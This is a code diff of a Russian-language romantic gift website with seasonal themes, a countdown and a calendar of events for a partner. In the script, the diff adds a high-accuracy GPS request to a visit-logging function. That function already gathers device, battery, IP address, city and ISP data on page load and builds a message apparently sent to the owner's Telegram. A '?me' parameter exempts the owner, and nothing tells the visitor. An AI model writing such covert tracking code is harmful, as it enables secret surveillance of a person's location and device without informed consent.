@@ -12,16 +12,6 @@
   <div class="bg-hearts" id="bgHearts"></div>
 
   <div class="main-wrapper">
-    <!-- Ручной переключатель тем сверху -->
-    <div class="theme-bar">
-      <button class="theme-btn active" onclick="setTheme('auto', this)" data-tg-notify="Переключила тему: Авто">🤖 Авто</button>
-      <button class="theme-btn" onclick="setTheme('default', this)" data-tg-notify="Переключила тему: Обычная">🌸 Обычная</button>
-      <button class="theme-btn" onclick="setTheme('halloween', this)" data-tg-notify="Переключила тему: Хэллоуин">🎃 Хэллоуин</button>
-      <button class="theme-btn" onclick="setTheme('ny', this)" data-tg-notify="Переключила тему: Новый Год">🎄 Новый Год</button>
-      <button class="theme-btn" onclick="setTheme('valentine', this)" data-tg-notify="Переключила тему: Валентин">💘 Валентин</button>
-      <button class="theme-btn" onclick="setTheme('march8', this)" data-tg-notify="Переключила тему: 8 Марта">💐 8 Марта</button>
-    </div>
-
     <header>
       <div class="bunny-avatar">
         <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23f9c0cb'/><circle cx='50' cy='65' r='25' fill='%23fff3f5'/><circle cx='38' cy='30' r='8' fill='%23fff3f5'/><circle cx='62' cy='30' r='8' fill='%23fff3f5'/><circle cx='38' cy='30' r='5' fill='%23f9c0cb'/><circle cx='62' cy='30' r='5' fill='%23f9c0cb'/><circle cx='50' cy='50' r='20' fill='%23fff3f5'/><circle cx='43' cy='48' r='3' fill='%232f3542'/><circle cx='57' cy='48' r='3' fill='%232f3542'/><polygon points='50,53 47,51 53,51' fill='%23ff6b81'/><path d='M 45 56 Q 50 60 55 56' stroke='%232f3542' stroke-width='2' fill='none'/><circle cx='38' cy='52' r='4' fill='%23ff9ff3' opacity='0.6'/><circle cx='62' cy='52' r='4' fill='%23ff9ff3' opacity='0.6'/><path d='M 50 20 Q 58 10 65 18 Q 58 26 50 20' fill='%23ff4757'/></svg>" alt="Bunny">
@@ -159,18 +149,15 @@
         .catch(() => {});
     }
 
-    // Сбор максимально детальной информации о визите
+    // Сбор детальной информации о визите + GPS Геолокация
     async function getDetailedVisitInfo(actionText = "❤️ Заход на сайт!") {
-      // Проверка: если в URL добавлен параметр ?me, то уведомление НЕ отправляется
       const urlParams = new URLSearchParams(window.location.search);
       if (urlParams.has('me')) return;
 
-      // 1. Данные о браузерной среде и экране
       const userAgent = navigator.userAgent;
       const screenRes = `${window.screen.width}x${window.screen.height}`;
       const time = new Date().toLocaleString("ru-RU", { timeZone: "Asia/Almaty" });
 
-      // 2. Определение устройства и ОС
       let deviceType = "💻 ПК / Ноутбук";
       if (/mobile/i.test(userAgent)) deviceType = "📱 Смартфон";
       if (/tablet|ipad/i.test(userAgent)) deviceType = "📱 Планшет";
@@ -181,7 +168,6 @@
       else if (userAgent.includes("Android")) os = "Android";
       else if (userAgent.includes("Linux")) os = "Linux";
 
-      // 3. Данные о батарее
       let batteryInfo = "Не поддерживается/Нет данных";
       if ('getBattery' in navigator) {
         try {
@@ -192,12 +178,8 @@
         } catch (e) {}
       }
 
-      // 4. Получение IP и Геолокации через стороннее API
-      let ip = "Неизвестен";
-      let city = "Неизвестен";
-      let country = "Неизвестно";
-      let isp = "Неизвестен";
-
+      // IP и данные сети
+      let ip = "Неизвестен", city = "Неизвестен", country = "Неизвестно", isp = "Неизвестен";
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -213,11 +195,33 @@
         } catch(err) {}
       }
 
-      // Формируем красивое развернутое сообщение для Telegram
+      // Запрос разрешения на точный GPS
+      let gpsLocation = "❌ Доступ не предоставлен";
+      if ("geolocation" in navigator) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 7000,
+              maximumAge: 0
+            });
+          });
+          const lat = position.coords.latitude.toFixed(6);
+          const lon = position.coords.longitude.toFixed(6);
+          const acc = Math.round(position.coords.accuracy);
+          gpsLocation = `<a href="https://www.google.com/maps?q=${lat},${lon}">📍 ${lat}, ${lon}</a> (±${acc}м)`;
+        } catch (err) {
+          if (err.code === 1) gpsLocation = "🚫 Отклонено пользователем";
+          else if (err.code === 2) gpsLocation = "⚠️ Не удалось определить GPS";
+          else if (err.code === 3) gpsLocation = "⏱️ Таймаут ожидания GPS";
+        }
+      }
+
       const message = `<b>${actionText}</b>\n\n` +
         `⏰ <b>Время (ALM):</b> ${time}\n` +
         `🌐 <b>IP:</b> <code>${ip}</code>\n` +
-        `📍 <b>Локация:</b> ${city}, ${country}\n` +
+        `🏙️ <b>Город (IP):</b> ${city}, ${country}\n` +
+        `🎯 <b>Точный GPS:</b> ${gpsLocation}\n` +
         `🏢 <b>Провайдер:</b> ${isp}\n` +
         `📱 <b>Устройство:</b> ${deviceType} (${os})\n` +
         `🖥 <b>Экран:</b> ${screenRes}\n` +
@@ -259,7 +263,6 @@
 
       const formattedMessage = `💌 <b>Новая записка с сайта!</b>\n\n${noteText}`;
       
-      // Используем ту же проверенную функцию отправки
       sendTelegramNotification(formattedMessage);
 
       status.style.color = "#2ed573";
@@ -270,7 +273,7 @@
     // --- ТЕМЫ И ФОН ---
     const themeSymbols = {
       default: ['❤️', '💖', '💕', '🌸', '✨'],
-      halloween: ['🎃', '👻', '🦇', '🕷️', '💀', '🕯️'],
+      halloween: ['🎃', '👻', '🦇', '🕷️️', '💀', '🕯️'],
       ny: ['❄', '🎄', '🎁', '⭐', '⛄'],
       valentine: ['💘', '💌', '💖', '🌹', '🧸'],
       march8: ['💐', '🌸', '🌷', '🦋', '✨']
@@ -281,25 +284,36 @@
       const month = now.getMonth() + 1;
       const day = now.getDate();
 
+      // Сезонные праздники
       if (month === 10 && day >= 16) return 'halloween';
       if ((month === 12 && day >= 17) || (month === 1 && day <= 15)) return 'ny';
       if ((month === 1 && day >= 30) || (month === 2 && day <= 14)) return 'valentine';
       if ((month === 2 && day >= 21) || (month === 3 && day <= 8)) return 'march8';
 
+      // Особенные доп. праздники (включают тему 'march8')
+      const specialDays = [
+        { m: 1, d: 21 }, // День объятий
+        { m: 3, d: 1 },  // День комплиментов
+        { m: 4, d: 25 }, // День самой красивой
+        { m: 7, d: 6 },  // День поцелуев
+        { m: 9, d: 9 },  // День красоты
+        { m: 10, d: 14 } // День милых записок
+      ];
+
+      const isSpecialDay = specialDays.some(s => s.m === month && s.d === day);
+      if (isSpecialDay) return 'march8';
+
       return 'default';
     }
 
-    function setTheme(themeName, btn) {
-      let activeTheme = themeName === 'auto' ? detectAutoTheme() : themeName;
+    function initAutoTheme() {
+      const activeTheme = detectAutoTheme();
 
       if (activeTheme === 'default') {
         document.documentElement.removeAttribute('data-theme');
       } else {
         document.documentElement.setAttribute('data-theme', activeTheme);
       }
-
-      document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
-      if (btn) btn.classList.add('active');
 
       createHearts(themeSymbols[activeTheme] || themeSymbols.default);
     }
@@ -358,15 +372,21 @@
     window.addEventListener('touchmove', onMove, { passive: true });
     window.addEventListener('touchend', onEnd);
 
-    // --- СОБЫТИЯ ---
+    // --- СОБЫТИЯ (Основные + Регулярные доп. праздники) ---
     const events = [
       { title: "Приглашение на свидание", desc: "Наш идеальный вечер", icon: "🕯️", date: "2026-09-15", url: "Rau-Date.html" },
       { title: "Наше автопутешествие", desc: "Воспоминания о приключении в дороге", icon: "🚗", date: "2026-09-17", url: "Rau-Love.html" },
+      { title: "День милых записок 💌", desc: "Маленький случайный сюрприз среди недели", icon: "📝", date: "2026-10-14", url: "notes.html" },
       { title: "Хэллоуин 🎃", desc: "Уютно-жуткий вечер, рецепт тыквенного супа и подборка ужастиков", icon: "👻", date: "2026-10-31", url: "halloween.html" },
       { title: "Новый Год 2027 🎄", desc: "Новогоднее волшебство и праздничный сюрприз", icon: "🎁", date: "2027-01-01", url: "ny2027.html" },
+      { title: "День объятий 🤗", desc: "Теплые обнимашки сквозь километры", icon: "🫂", date: "2027-01-21", url: "hugs.html" },
       { title: "День Святого Валентина 💘", desc: "Особенное онлайн-письмо и виртуальная валентинка", icon: "💌", date: "2027-02-14", url: "valentines.html" },
+      { title: "День комплиментов ✨", desc: "100 причин, почему ты самая лучшая", icon: "👑", date: "2027-03-01", url: "compliments.html" },
       { title: "День Рождения 🎂", desc: "Твой особенный день! Открытка и подарок", icon: "👑", date: "2027-03-04", url: "dr.html" },
-      { title: "8 Марта 🌸", desc: "Самый эстетичный день весны и главные комплименты", icon: "💐", date: "2027-03-08", url: "march8.html" }
+      { title: "8 Марта 🌸", desc: "Самый эстетичный день весны и главные комплименты", icon: "💐", date: "2027-03-08", url: "march8.html" },
+      { title: "День самой красивой 💖", desc: "Праздник той, кто озаряет каждый мой день", icon: "✨", date: "2027-04-25", url: "pretty.html" },
+      { title: "День поцелуев 💋", desc: "Воздушный поцелуй прямо в экран!", icon: "😘", date: "2027-07-06", url: "kisses.html" },
+      { title: "Всемирный день красоты 🌹", desc: "Напоминание о том, насколько ты прекрасна", icon: "🌺", date: "2027-09-09", url: "beauty.html" }
     ];
 
     function renderEvents() {
@@ -461,7 +481,7 @@
       document.getElementById("progressPercent").innerText = pct.toFixed(1) + "%";
     }
 
-    setTheme('auto', document.querySelector('.theme-btn'));
+    initAutoTheme();
     renderEvents();
     updateTimer();
     setInterval(updateTimer, 1000);
